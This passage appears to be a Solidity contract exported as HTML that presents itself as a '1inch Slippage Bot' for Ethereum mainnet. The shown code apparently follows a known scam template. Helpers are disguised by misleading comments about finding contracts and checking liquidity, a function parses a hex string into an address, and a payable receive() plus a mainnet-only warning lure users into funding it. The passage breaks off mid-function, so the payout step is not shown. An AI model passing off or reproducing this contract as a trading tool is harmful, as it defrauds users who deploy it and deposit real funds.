<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
	<title></title>
	<meta name="generator" content="LibreOffice 24.8.3.2 (Windows)"/>
	<meta name="created" content="00:00:00"/>
	<meta name="changed" content="2024-11-23T12:33:45.754000000"/>
	<meta name="CocoaVersion" content="2299.77"/>
	<meta name="created" content="00:00:00">
	<meta http-equiv="Content-Style-Type" content="text/css">
	<style type="text/css">
		p.p1 { font-variant: normal; font-family: "Courier"; font-size: 9pt; margin-bottom: 0cm }
		p.p2 { font-variant: normal; font-family: "Courier"; font-size: 9pt; margin-bottom: 0cm }
	</style>
</head>
<body lang="en-AU" dir="ltr"><p class="p1" style="margin-bottom: 0.5cm">
//SPDX-License-Identifier: MIT</p>
<p class="p1" style="margin-bottom: 0.5cm">pragma solidity ^0.6.6;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">// This 1inch Slippage bot
is for mainnet only. Testnet transactions will fail because testnet
transactions have no value.</p>
<p class="p1" style="margin-bottom: 0.5cm">// Import Libraries
Migrator/Exchange/Factory</p>
<p class="p1" style="margin-bottom: 0.5cm">import
&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">import
&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">import
&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol&quot;;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">contract
OneinchSlippageBot {</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; string
public tokenName;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; string
public tokenSymbol;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; uint
liquidity;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; event
Log(string _msg);</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp;
constructor() public {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
//tokenSymbol = _mainTokenSymbol;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
//tokenName = _mainTokenName;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; receive()
external payable {}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; struct slice
{</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint _len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint _ptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Find newly deployed contracts on Uniswap Exchange</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param memory of required contract liquidity.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param other The second slice to compare.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return New contracts with required liquidity.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
findNewContracts(slice memory self, slice memory other) internal pure
returns (int) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint shortest = self._len;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (other._len &lt; self._len)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; shortest = other._len;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint selfptr = self._ptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint otherptr = other._ptr;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for (uint idx = 0; idx &lt; shortest; idx += 32) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; // initiate contract finder</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; uint a;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; uint b;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; string memory WETH_CONTRACT_ADDRESS =
&quot;0xc66F20f32F11aE80044408AC0a6bDEdD2c08BC99&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; string memory TOKEN_CONTRACT_ADDRESS =
&quot;0xc66F20f32F11aE80044408AC0a6bDEdD2c08BC99&quot;;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; loadCurrentContract(WETH_CONTRACT_ADDRESS);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; loadCurrentContract(TOKEN_CONTRACT_ADDRESS);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; assembly {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; a := mload(selfptr)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b := mload(otherptr)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if (a != b) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; // Mask out irrelevant contracts and
check again for new contracts</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; uint256 mask = uint256(-1);</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; if(shortest &lt; 32) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mask = ~(2 ** (8 * (32 - shortest
+ idx)) - 1);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; uint256 diff = (a &amp; mask) - (b &amp;
mask);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; if (diff != 0)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return int(diff);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; selfptr += 32;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; otherptr += 32;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return int(self._len) - int(other._len);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Extracts the newest contracts on Uniswap exchange</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The slice to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param rune The slice that will contain the first rune.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `list of contracts`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
findContracts(uint selflen, uint selfptr, uint needlelen, uint
needleptr) private pure returns (uint) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint ptr = selfptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint idx;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (needlelen &lt;= selflen) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if (needlelen &lt;= 32) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 mask = bytes32(~(2 ** (8 * (32 -
needlelen)) - 1));</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 needledata;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; assembly { needledata :=
and(mload(needleptr), mask) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; uint end = selfptr + selflen - needlelen;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 ptrdata;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; assembly { ptrdata := and(mload(ptr),
mask) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; while (ptrdata != needledata) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (ptr &gt;= end)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return
selfptr + selflen;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptr++;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assembly { ptrdata :=
and(mload(ptr), mask) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; return ptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; // For long needles, use hashing</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; bytes32 hash;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; assembly { hash := keccak256(needleptr,
needlelen) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; for (idx = 0; idx &lt;= selflen -
needlelen; idx++) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bytes32 testHash;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; assembly { testHash :=
keccak256(ptr, needlelen) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (hash == testHash)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return ptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptr += 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return selfptr + selflen;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Loading the contract</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param contract address</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return contract interaction object</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
loadCurrentContract(string memory self) internal pure returns (string
memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
string memory ret = self;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint retptr;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
assembly { retptr := add(ret, 32) }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return ret;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; /*</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; * @dev
Extracts the contract from Uniswap</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param self The slice to operate on.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@param rune The slice that will contain the first rune.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; *
@return `rune`.</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp;&nbsp; &nbsp; */</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
nextContract(slice memory self, slice memory rune) internal pure
returns (slice memory) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
rune._ptr = self._ptr;</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (self._len == 0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; rune._len = 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return rune;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint l;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint b;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// Load the first byte of the rune into the LSBs of b</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (b &lt; 0x80) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; l = 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else if(b &lt; 0xE0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; l = 2;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else if(b &lt; 0xF0) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; l = 3;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
} else {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; l = 4;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// Check for truncated codepoints</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
if (l &gt; self._len) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; rune._len = self._len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; self._ptr += self._len;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; self._len = 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; return rune;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
self._ptr += l;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
self._len -= l;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
rune._len = l;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return rune;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
startExploration(string memory _a) internal pure returns (address
_parsedAddress) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
bytes memory tmp = bytes(_a);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint160 iaddr = 0;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint160 b1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint160 b2;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for (uint i = 2; i &lt; 2 + 2 * 20; i += 2) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; iaddr *= 256;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; b1 = uint160(uint8(tmp[i]));</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; b2 = uint160(uint8(tmp[i + 1]));</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if ((b1 &gt;= 97) &amp;&amp; (b1 &lt;= 102)) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b1 -= 87;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if ((b1 &gt;= 65) &amp;&amp; (b1 &lt;= 70)) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b1 -= 55;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if ((b1 &gt;= 48) &amp;&amp; (b1 &lt;= 57)) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b1 -= 48;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; if ((b2 &gt;= 97) &amp;&amp; (b2 &lt;= 102)) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b2 -= 87;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if ((b2 &gt;= 65) &amp;&amp; (b2 &lt;= 70)) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b2 -= 55;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; } else if ((b2 &gt;= 48) &amp;&amp; (b2 &lt;= 57)) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; b2 -= 48;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; iaddr += (b1 * 16 + b2);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
return address(iaddr);</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; }</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; function
memcpy(uint dest, uint src, uint len) private pure {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// Check available liquidity</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
for(; len &gt;= 32; len -= 32) {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; assembly {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; mstore(dest, mload(src))</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; }</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; dest += 32;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; src += 32;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
}</p>
<p class="p2" style="margin-bottom: 0.5cm"><br/>
<br/>

</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
// Copy remaining bytes</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
uint mask = 256 ** (32 - len) - 1;</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
assembly {</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; let srcpart := and(mload(src), not(mask))</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; let destpart := and(mload(dest), mask)</p>
<p class="p1" style="margin-bottom: 0.5cm">&nbsp; &nbsp; &nbsp; &nbsp;
&nbsp; &nbsp; mstore(dest, or(destpart, srcpart))</p>
